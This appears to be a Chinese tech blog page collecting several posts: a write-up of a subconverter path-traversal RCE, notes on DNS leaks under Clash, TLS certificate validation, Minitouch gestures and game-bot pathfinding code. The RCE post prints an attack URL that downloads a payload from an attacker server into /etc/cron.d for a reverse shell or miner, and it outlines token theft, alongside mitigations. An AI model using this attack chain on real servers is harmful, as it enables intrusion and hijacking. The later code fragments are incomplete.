subconverter RCE 漏洞

2024-10-28
网络安全

2022 年 5 月前后，安全研究人员披露了 v0.7.2 及更早版本中存在的一个无需身份验证即可触发的 远程代码执行（RCE）漏洞。

漏洞原理解析

功能机制：动态加载外部配置文件
subconverter 允许用户通过 URL 参数传入自定义的配置模板（例如 config 参数或 ruleset 参数）。
当用户请求转换订阅时，subconverter 会去下载这个指定的外部配置文件，并将转为MD5作为文件名称保存到本地服务器磁盘上，然后再读取解析。

漏洞产生：缺少安全过滤（Path Traversal 目录穿越）
在受影响的版本（如 v0.7.2）中，程序对传入的配置文件文件名或下载路径没有进行严格的过滤和规范化处理。
攻击者可以在请求的参数中，构造带有 ../（路径穿越/目录遍历）特性的文件名或恶意路径。

恶意覆盖：任意写文件
由于没有限制写入文件的路径和类型，攻击者可以控制 subconverter 将任意内容写入到服务器上的任意可写位置。例如：
覆盖 Linux 上的系统配置文件。
写入到系统的计划任务目录（/etc/cron.d/ 或 /var/spool/cron/crontabs/）。
如果 subconverter 部署在 Web 服务器根目录下，攻击者可以直接写入可执行的 WebShell。

完整的入侵过程示例

公网批量扫描：
攻击者利用全网扫描工具（如 Shodan、FOFA）搜索暴露在公网的 subconverter 端口（默认如 25500）。

构造恶意 Payload：
攻击者搭建一个恶意 HTTP 服务，准备好一个包含反弹 Shell（Reverse Shell）或挖矿脚本命令的 Cron 定时任务文件。

发送攻击请求：
攻击者向目标 subconverter 发送精心构造的 GET/POST 请求，参数类似：
http://<Target-IP>:25500/sub?target=clash&url=http://恶意服务器/evil.cfg&config=../../../../../../etc/cron.d/evil_job

服务器被动下载并写入：
subconverter 接收到请求，去下载 evil.cfg，并将其强制保存至 ../../../../../../etc/cron.d/evil_job。

服务器失陷：
Linux Cron 机制触发 evil_job 中的命令，向攻击者的 C2（控制服务器）反弹 Shell，或者开始下载运行 XMRig 挖矿程序。

API 是如何被恶意调用的？

Subconverter 内置了一些用于获取模板或配置信息的 API 接口（如 /getprofile 或 /sub 相关的扩展接口。
问题：代码对路径参数没有做严谨的过滤（目录穿越漏洞）。
结果：攻击者可以直接调用这些 API 接口，越权读取服务器上的配置文件（pref.ini 等）。不仅能看到服务器是否开启了缓存（aCache），甚至还能直接获取到管理员设置的 token。

Subconverter 提供了转换与缓存功能。当你请求转换一个链接时，后端 API 会把下载到的内容保存在服务器本地的缓存目录（cache）中，并以链接的 MD5 散列值作为文件名。
问题：API 允许传入任意远程 URL 参数。
利用：攻击者构造一个指向自己恶意服务器的 URL（里面包含反弹 Shell 的 Bash 脚本），调用 Subconverter 的转换 API。Subconverter 会“听话”地把这段恶意脚本下载下来，并当作缓存文件保存在服务器磁盘上。

Subconverter 内部有一个用于动态解析/运行脚本的 API 接口。
问题：如果服务器没有开启认证（api_mode=false），或者 Token 使用了默认弱口令（如 password）/ 已经在第一步被泄漏，任何人都可以免鉴权或使用泄漏的 Token 调用该 API。
利用：攻击者调用该 API，传入第二步中生成的 MD5 缓存文件名，指示后端“去执行这个缓存文件里的脚本”。服务器收到 API 命令后，立刻在后台执行了 Bash 脚本，向攻击者的 VPS 发起反弹连接 。

解决办法

禁用缓存在 pref.ini 配置文件中设置：

必须开启 api_mode 并设置“强 Token”

在 Nginx 配置中，拦截或禁止公网访问用于读取配置和脚本调用的接口：
拦截 /convert?url=… 这种带敏感参数的请求。
封禁 /qx-script 等历史高危接口。
只向公网暴露常规的 /sub 订阅转换主接口。

容器隔离与非 Root 运行
使用 Docker 部署：并将容器根目录挂载为只读（Read-Only）。
禁止 Root 权限：即使黑客真的找到未知的 Day 漏洞拿到了权限，他也只是被困在一个没有写入权限、非 Root 用户的 Docker 容器内部，无法触及你的真实宿主机和网段。

DNS 泄露

2024-10-23
网络安全

检测网站原理

  • https://ipleak.net/
  • https://browserleaks.com/dns
  • https://dnsleaktest.com/
  • https://ippure.com/DNS-Leak-Detect.html

向一个范域名发起随机的域名请求例如：https://f8s4t5tznopvidjf54v5e6pbbnlbyov7gsuh02oh-2.ipleak.net/dnsdetection/ ， 这可以保证浏览器缓存，运营商的DNS缓存，上游的DNS缓存都没有这条记录。

运营商通过负载均衡交给上游不同的DNS服务器做解析，最终会找到这个域名的权威域名服务器。当递归查询到达权威服务器时，权威服务器能够直接看到“是谁来向我询问这个随机域名的 IP”，并把这个来访者的 IP 地址记录在后台数据库里。

这里的“谁”，指的就是代表你跑去向权威服务器提问的那台 DNS 服务器（通常是运营商的上游/递归 DNS 服务器，或者你代理节点的 DNS 服务器），绝不是检测网站本身的 IP。

因为完全随机的域名会导致运营商使用不同的上游DNS服务器查询，因此也会得到不同地址。 DNS泄露不是是你电脑的真实 IP，而是你“正在使用哪家运营商/哪个地区的 DNS 服务器”这个信息，以及你“正在访问什么网站”的隐私意图。

DNS泄露的本质就是， DNS 请求是从你“本地设备/本地网络”直接发出去的（哪怕经过了加密）,加密（Security） $\neq$ 匿名/防泄露（Privacy & Anonymity）。

加密只是把内容装进了“保险箱”，但快递单地址是公开的,宽带运营商能清楚地看到,你电脑的真实 IP,国内 DNS 服务器的 IP 显然知道这是在做DNS查询，当查询结束后向墙外VPN节点发送大量数据，就可以判定为在使用代理。

因此DNS泄露的本质就是在本地发起了DNS请求,以下这些日常场景也非常容易导致 DNS 泄露：

场景 A：主域名在规则里，但“子域名 / CDN 域名”不在规则里
很多大型海外网站或软件，其服务是由成百上千个极其隐蔽的二级域名或第三方 CDN 支撑的。

例子：你访问某个海外知名软件，主网站 example.com 被代理了，但它后台拉取的某些组件域名（如 static-assets-123.azureedge.net）可能没有收录在你的规则库里。

结果：这个子域名就会掉进默认的本地解析流程，导致在本地发起了 DNS 查询，造成泄露。

场景 B：App / 软件后台的“静默探针”与 DNS 预解析
现在的操作系统（如 Windows、macOS）和浏览器（如 Chrome）都有 DNS 预解析（DNS Prefetching） 功能。

当你打开一个包含大量网页链接的页面时，浏览器为了让你点击时更快，会悄悄在后台把页面里所有链接对应的 DNS 全部提前查一遍。

如果其中包含未经分流匹配的域名，哪怕你根本没有主动去点击那个“小众网站”，你的电脑也已经在后台完成了一次 DNS 泄露。

场景 C：BT / P2P 下载（如 BitTorrent）
当你使用 BT 软件下载海外资源时，BT 客户端需要向全球成千上万个 Tracker 服务器（有些直接是域名形式）汇报自己的状态。如果代理配置不当，这些密集且随机的 Tracker 域名查询会瞬间通过本地 DNS 爆发式泄露。

为什么 Clash 等代理软件会在本地发起DNS请求呢?

核心矛盾一：分流规则（Rule）需要 IP 来判断,Clash 最强大的功能是智能分流（比如：国内网站直连、国外网站走代理、广告直接拦截）。

但绝大多数分流规则，不仅包含域名规则（DOMAIN-SUFFIX），还包含大量的 IP 段规则（IP-CIDR，例如 114.114.114.114/24 或国内 IP 库 GEOIP,CN）。

逻辑死结：当你在浏览器输入 baidu.com 或某个未知的域名时，Clash 在本地拿到这个域名，它如果不先去解析出它的 IP，就无法判断这个 IP 到底属于中国还是国外。

后果：为了判断这个流量该走“直连”还是“代理”，Clash 必须先在本地搞清楚这个域名对应的 IP 是什么。这就逼得它必须在本地发起一次 DNS 请求。

核心矛盾二：DNS 污染与 CDN 加速的“两难抉择”

如果让远端海外节点统一代为解析所有 DNS，看似防住了泄露，却带来了一个巨大的体验痛点：国内网站访问极慢（甚至打不开）。

假设全部交给海外节点解析（Remote DNS）：当你访问淘宝、微信、淘宝等国内服务时：

海外节点在国外帮你查 DNS，CDN 会以为是海外用户在访问，于是返回了一个美国的 CDN 加速服务器 IP。

你的电脑拿到这个美国 IP，虽然走直连，但数据包要绕地球一圈去连美国的服务器。

结果就是：开了代理后，国内所有网页和 App 变得卡顿无比。

为了解决这个问题，Clash 必须设计成：国内的域名用本地 DNS 解析（确保拿到最近的 CDN IP），国外的域名才去远端解析。 但只要稍有配置不当（例如分流规则没覆盖全），国外的域名就会误跑进本地 DNS 进行解析，从而造成了 DNS 泄露。

系统层面的“劫持机制”限制

在许多操作系统（Windows / macOS / Android）中，当代理软件开启“系统代理”模式时，浏览器或系统网络栈并不知道你开的是 Socks5/HTTP 代理。

系统的默认行为是：“我要连一个网站，必须先通过操作系统的网络协议栈把域名转成 IP，然后再把 TCP 流量交给代理软件。”

这就导致在流量进入 Clash 之前，操作系统自身就已经抢先向本地网络发起了 DNS 查询。

clash 系统代理配置

核心原理

当数据包匹配到 GEOIP,CN（中国 IP 库）时，如果访问的是一个域名，Clash 为了知道这个域名是不是国内 IP，会在本地悄悄发起一次 DNS 查询。这就瞬间导致了 DNS 泄露！

这段配置的做法：加上了 ,no-resolve，意思是“只匹配纯 IP 流量，如果是域名流量，直接跳过这条规则！绝对不许在本地查 DNS！”

既然删掉了 IP 查 DNS 的功能，那怎么分流呢？配置里的规则顺序非常考究：

精准域名直连：ChinaDomain.list、ChinaMedia.list 等文件里包含了成千上万个国内常用域名（如 .cn、baidu.com、qq.com）。匹配到了就安心走 DIRECT（直连）。

IP 纯直连：ChinaIp.list 和 GEOIP,CN,no-resolve 负责拦截软件/游戏的纯 IP 直连请求。

任何既不在国内域名列表里、又没被 IP 拦截的网站（比如你要访问的被墙/海外小众网站），都会一路下坠，直接撞进这最后一杠 FINAL！

结果：直接交给 🚀 节点选择 远端节点。本地不上网查 DNS，直接把原始域名丢给远端海外服务器去解析。

clash TUN 模式配置

多宿主异步 DNS 解析”（Smart Multi-Homed Name Resolution, SMHNR）

当系统需要解析一个域名时，它不会老老实实地只向“当前最主要的网卡”发请求，而是会同时向你电脑上所有的活动网卡（物理网卡、Wi-Fi、TUN 虚拟网卡等）绑定的 DNS 服务器同时发起并发请求。谁先返回结果，Windows 就用谁的结果，并把慢的那个丢弃。

在 TUN 模式下，为什么会瞬间导致泄露？

当你开启 Clash 的 TUN 模式时，系统里相当于多了一张“虚拟网卡”：你访问一个网站（比如 example.com）。

Windows 的 SMHNR 机制启动，同时做两件事：

向 TUN 虚拟网卡（Clash）发送 DNS 请求。

向 物理网卡（你家的局域网/电信联通网卡）绑定的本地 DNS（如 192.168.1.1 或 114.114.114.114）发送 DNS 请求。

物理网卡通常在本地局域网内，响应速度极快（可能只需几毫秒）。

结果：物理网卡抢答成功！本地运营商立刻收到了这个 DNS 查询，检测网站也成功抓包——DNS 泄露瞬间发生！

哪怕 Clash 策略组写得再严密，因为流量在还没进入 TUN 网卡之前，就被 Windows 系统层直接从物理网卡“偷溜”发了一份出去。

在 TUN 模式配置中，确保开启了以下两项：

stack: system 或 gvisor

auto-route: true

strict-route: true（严格路由模式）

💡 原理：开启 strict-route 后，Clash 会在 Windows 系统底层设置最高优先级的路由表和防火墙规则，强制丢弃/拦截所有从非 TUN 物理网卡直接发出的 DNS UDP/TCP 数据包，直接把 Windows 的抢答通道给断掉。

FAQ

Q1: 只要启动 docker 服务，nvidia-smi 就会报错

A1: 显卡从休眠唤醒失败： 笔记本显卡在空闲时，Linux 驱动会自动把 GPU 置入 D3cold（深度省电模式）。当 Docker 容器启动并加载 CUDA/ONNX 运行时，会强行向 GPU 发送初始化指令，导致显卡从休眠唤醒时 PCIe 响应超时。

驱动失去响应： 唤醒失败后，NVIDIA 驱动抛出错误（通常会在内核日志里显示 GPU has fallen off the bus），导致 nvidia-smi 无法读取传感器温度、风扇和功耗信息，全显示为 ERR!。

安全建议

  • 设置非全局模式，国内能访问的站点就不要使用代理
  • HTTP 站点如果要进行敏感操作，不要使用代理（安全的网站都是用 HTTPS 协议）

  • 最好不要使用自带节点的第三方软件，某某加速器、某某 VPN 等这种软件可能会给你安装证书。
  • 经常性检查证书链，保障数据安全

证书校验流程

当我们首次访问一个之前从未去过的网站（比如 https://example.com）时，你的电脑里确实没有 example.com 的证书。

那么浏览器到底是怎么敢信任这个网站的呢？核心原因在于：TLS 证书体系采用的是“信任链 (Chain of Trust)”机制。

你可以把证书验证想象成去办理出国签证：海关（浏览器）并不认识你个人（网站），但海关认识给你盖章的“大使馆/公安局（根证书颁发机构 CA）”。

证书的“家族树”：三层信任链结构，在真实的互联网中，证书通常分为三层：

根证书 (Root CA)：全球权威的“超级公章”（如 DigiCert, Sectigo, Let’s Encrypt）。它们数量很少（几百个），在你买电脑/装操作系统时，微软或苹果就已经预先打包安装在你的系统里了。

中级证书 (Intermediate CA)：根证书的“代理人”。为了防止根证书的私钥泄露导致全球信任崩塌，根 CA 通常把私钥锁在保险柜里，平时只用中级证书来给具体的网站盖章。

站点证书 (Leaf Certificate)：网站管理员买到的、写着 example.com 的证书。

当 Chrome 拿到服务器发过来的证书链后，它会在你的电脑本地进行以下 4 步严格审查：

步骤 A：查验域名与有效期 (Domain & Expiry Verification)

检查域名：这个证书里的 Subject Alternative Name (SAN) 字段写的是不是 example.com？（防止拿 baidu.com 的证书来冒充 example.com）。

检查时间：当前时间是不是在证书的 Not Before 和 Not After（有效期）之间？

步骤 B：沿着“信任链”向上溯源 (Chain Building)

浏览器看站点证书：“你是 example.com，谁给你签发的？” $\rightarrow$ 发现签名者是 “DigiCert Global TLS Intermediate CA”。

浏览器检查随请求一起发过来的中级证书，确认签名正确。

浏览器继续看中级证书：“你又是谁签发的？” $\rightarrow$ 发现签名者是 “DigiCert Global Root CA”。

步骤 C：对暗号，比对系统预装的“根证书库” (Trust Anchor Matching)

浏览器拿着寻找目标的名称 “DigiCert Global Root CA”，打开你的 Windows 系统内置的 “受信任的根证书颁发机构” 数据库。

结果：找到了！ 你的 Windows 系统里早已躺着这个 DigiCert 的根证书公钥。

步骤 D：数学密码学验证（公钥验签）

用系统里的根证书公钥，去解密并验证中级证书上的数字签名 $\rightarrow$ 验证成功！（证明中级证书合法）。

用中级证书的公钥，去解密并验证 example.com 站点证书上的数字签名 $\rightarrow$ 验证成功！（证明站点证书合法）。

兜底检查：证书有没有被临时吊销？(Revocation Check)

即使证书没过期、签名也对，网站如果私钥泄露，CA 机构会提前吊销这张证书。浏览器还会通过以下方式快速确认：

OCSP Stapling（在线证书状态协议）：服务器在握手时直接附带一份来自 CA 的“带防伪印章的证明”，证明这张证书今天依然有效。

CRL（证书吊销列表）：浏览器定期下载的黑名单列表。

手势

为什么原生 ADB 无法实现连续的复杂手势,Minitouch 可以完美实现

每次你执行一句 adb shell input 命令，Android 底层都需要启动一个新的 Java 进程（app_process）来解析和执行这个动作。这个进程的启动和虚拟机初始化通常需要 100ms - 300ms 甚至更久。如果你想通过连续发送多条 ADB 命令来画一个圆，命令与命令之间会有明显的卡顿和停顿，手指（触点）会在屏幕上“断开”又“重连”，根本连不起来。

指令本身的局限性（缺乏流式控制）
原生 ADB 的 input 命令只支持离散的指令（点击一次，或者两点之间的一条直线滑动）。它没有提供“按下 (Down) -> 移动到点A (Move) -> 移动到点B (Move) -> 抬起 (Up)” 这种拆分状态的流式 (Streaming) 接口。

当你在 Airtest 中指定了 touch_method=MINITOUCH 时，Airtest 并不是在调用 ADB 命令，而是使用了完全不同的底层架构：

常驻的 Socket 连接（零启动延迟）
Airtest 会在设备端推入一个用 C/C++ 编写的 minitouch 守护进程，并在设备内部启动一个 Server。你的纯 Python 脚本会通过 ADB 端口转发（Port Forwarding）与这个 Server 建立一个 TCP Socket 连接。建立连接后，Python 脚本发送动作指令只是一次极快的网络 I/O，延迟在毫秒级，完全没有进程启动的开销。

直达 Linux 内核级别的事件注入 (evdev)
Minitouch 绕过了 Android 庞大臃肿的 Framework 层（InputManager），直接向 Android 底层的 Linux 驱动节点（通常是 /dev/input/eventX）写入原始的触摸事件。

基于状态机的连续指令
Minitouch 拥有极其精简的自定义协议，完美支持连续动作。在你的 Python 脚本底层，Airtest 可以通过 Socket 连续发送如下指令：

d 0 100 200 50 (第 0 个触控点，在坐标 100,200 按下，压力 50)
c (Commit，提交生效)
m 0 110 210 50 (触控点 0 移动到 110,210)
c (提交生效)
u 0 (触控点 0 抬起)
c (提交生效)

实现一个手势
  1. 如何一直向着“雾气”区域探索？
    从图片 image_2e587d.jpg 中可以看出，探索过的区域是深灰色的地面（带绿树），而未探索的雾气呈现出非常明显的黄褐色/土黄色。

解决方案：HSV 颜色掩膜（Color Masking）
我们不再判断“哪里亮”，而是专门寻找“黄褐色”。

提取雾气： 使用 OpenCV 将小地图从 BGR 转换为 HSV 颜色空间。设定黄褐色的阈值（Hue 约在 15-40 之间），过滤出一张只包含雾气的二值化黑白图（雾气部分是白色，其他全是黑色）。

计算重心： 找到这块白色区域的重心（质心），或者寻找离屏幕中心（玩家）最近的雾气边缘点。

输出向量： 算出从屏幕中心指向这个雾气重心的角度，这就是你要前进的方向。

  1. 陷入四周都是黑色边界的死胡同，如何找到出口？
    在图片右侧和下方，不可跨越的边界（虚空/墙壁）呈现出纯黑色或极暗的棕黑色。当你陷入死胡同时，你的四周绝大部分方向都是这种纯黑边界，只有出口方向是深灰色的地面。

解决方案：小地图射线投射法（Minimap Raycasting）
这是一种非常经典的 2D 寻路算法，它模仿了雷达扫描。

二值化墙壁： 把小地图转化为灰度图，设定一个极低的亮度阈值（比如像素值 < 15），把所有“纯黑边界”提取出来。

发射射线： 以小地图中心（玩家位置）为起点，向 8 个或 16 个方向（每隔 45 度或 22.5 度）发射虚拟射线。

测量距离： 射线在碰到“纯黑像素”时停止。记录每条射线延伸的长度。

决策出口： 哪条射线最长，说明那个方向的空地最大、路最远。 在死胡同里，最长的那条线必定指向出口。

核心代码实现
我们可以将这两个逻辑写成两个函数。以下是利用 OpenCV 分析你这张截图的实现思路：

# 设定黄褐色雾气的 HSV 范围（需要根据实际截图微调）
lower_fog = np.array([15, 50, 50])

mask = cv2.inRange(hsv, lower_fog, upper_fog)

if contours:
    # 找到面积最大的雾气块
    largest_contour = max(contours, key=cv2.contourArea)
    M = cv2.moments(largest_contour)
    if M["m00"] != 0:
        # 计算雾气重心
        target_x = int(M["m10"] / M["m00"])
        target_y = int(M["m01"] / M["m00"])
        
        # 计算方向角
        h, w = minimap.shape[:2]
        center_x, center_y = w // 2, h // 2
        dx = target_x - center_x
        dy = center_y - target_y # Y轴向下反转
        angle = math.degrees(math.atan2(dy, dx))
        return angle % 360
return None

    while True:
        test_x = int(center_x + length * math.cos(radian))
        test_y = int(center_y - length * math.sin(radian))

        if not (0 <= test_x < w and 0 <= test_y < h):

        if gray[test_y, test_x] < 20:

    if length > max_length:
        max_length = length
        best_angle = angle

寻路逻辑的最佳整合
在你的主循环中，可以将这两个函数与之前讨论的状态机结合起来：

第一优先级： 检查小地图是否有红点（怪物），有则追踪。

第二优先级： 如果没怪物，调用 get_fog_direction()。如果有明确的雾气方向，向着雾气走。

第三优先级（兜底）： 如果被卡住（连续判定移动失败），立刻调用 find_exit_direction()，程序会像雷达一样扫出最长的那条路（即死胡同出口），强制向那里突围。

这三个问题非常深刻，完全触及了自动寻路算法（尤其是基于未知环境的“SLAM/前沿探索”算法）的最核心痛点。

其实，上一轮给你写的那套结合了“最近雾气（Closest Fog）”与“射线避障（Raycast）”的代码，在底层逻辑上已经天然地、数学化地兼容了这三种极端情况。

我们把这三个问题逐一拆解，看看这套逻辑是如何在底层完美闭环的。

问题一：出生地背后是墙，前方是雾气，如何兼容“走向雾气”与“沿墙走”？
逻辑核心：雾气是“目的”，墙壁是“约束”。

这套算法并不是“盲目找墙去贴”，而是“直线走向雾气，遇到墙才贴墙”。

在出生地，你的目标角度（最近的雾气）一定在前方。

算法会向前方发射射线。因为你背对墙壁，前方的射线是畅通无阻的（check_ray_clear 返回 True）。

此时，系统根本不会去理会你背后的墙，而是直接下达指令：直线走向前方的雾气。

只有当雾气在墙角的另一边，你的直线射线“撞”到了墙，算法才会启动“沿墙寻找安全角度”的逻辑（向左右偏移 15°、30° 等），从而表现出“顺着墙壁边缘走过去”的动作。

结论： 这两者完全不冲突，系统会自动在“开阔地直线冲锋”和“有障碍物贴墙绕行”之间无缝切换。

问题二：死胡同的墙被藏在雾气下，探开后发现死路，如何走出去？
你提到的细节非常精准：“墙的边界在雾气下面，没探索是看不见的”。这正是机器人导航中经典的“局部感知死胡同困境”。

但别担心，上一轮代码中的 get_best_safe_angle（安全角度扫掠）就是专门为了破解这个困境而设计的。让我们推演一下死胡同里的运作过程：

陷入死胡同： 你把死胡同里的雾气全吃光了，周围暴露出了纯黑的墙壁。

目标在墙外： 此时，离你最近的下一片雾气，一定在死胡同外面（也就是隔着一堵黑墙）。

直线撞墙： 算法向着那片雾气发射直线射线，必然撞到死胡同的黑墙。

雷达扫掠寻找出口： 算法发现前方不通，开始向两侧展开测试（±15°, ±30°…）。它发射的射线会扫过死胡同的左墙、右墙，全部提示撞墙。

找到来时的路： 当算法扫掠到死胡同的“入口”（也就是你刚走进来的那个方向，那里是深灰色的已探索地面，没有黑墙）时，射线畅通无阻！

成功脱困： 算法会立刻返回这个指向出口的角度。你的角色会华丽地转个身，顺着死胡同的边缘，稳稳地走出去。

结论： 只要死胡同有出口，射线扫掠机制（从 0° 一直扫到 180°）就一定能把出口“摸”出来，强制角色回头。

问题三：没有墙的独立雾气区域，如何保证不留下雾气碎块？
当你遇到一片处于广场正中央、周围没有任何墙壁的独立大雾区时，你担心角色会像无头苍蝇一样乱穿，把雾气切成碎片。

这正是我们使用 “最近边缘优先法则（Closest Frontier First）” 的最大意义。这套数学逻辑是自带“强迫症”的：

永远吃最近的一口： get_closest_fog 函数计算了屏幕上每一个雾气像素点到你当前位置的绝对欧氏距离。它不仅指出了方向，还锁定了离你最近的那个像素。

连续推进，绝不跳跃： 当你向着最近的像素走了一步，这个像素被探开了（变成了深灰色），下一帧，紧挨着它的那一点，自然就成为了新的“最近像素”。

推土机效应： 这种逻辑在宏观上表现出来的行为，就像是一台推土机。它会沿着雾气的最外层边缘，一层一层地、均匀地向内推进。

绝不留碎块： 如果系统留下了一个碎块在身后，那么那个身后的碎块距离你的绝对距离，一定小于前方的大片雾气。系统会立刻调转枪头，先把这个小碎块“吃干抹净”，然后再继续向前推进。

结论： 在没有墙壁干扰的开阔地带，基于欧氏距离最短的“贪心吃雾”算法，是最完美的“无死角扫图”策略。它在几何学上保证了探索边界的连续性，绝对不会遗漏任何一块碎片。

技术选型
推流与通信：

推流获取： 使用 scrcpy 的底层 ffmpeg / PyAV 接口，或者模拟器的共享内存/ADB 截图（每秒 15-30 帧即可满足 RL 需求）。

动作发送： Minidriver / Minitouch / ADB（高频低延迟点击）。

使用 Gymnasium (OpenAI Gym) 将游戏包装成标准环境：env.reset() 和 env.step(action)。
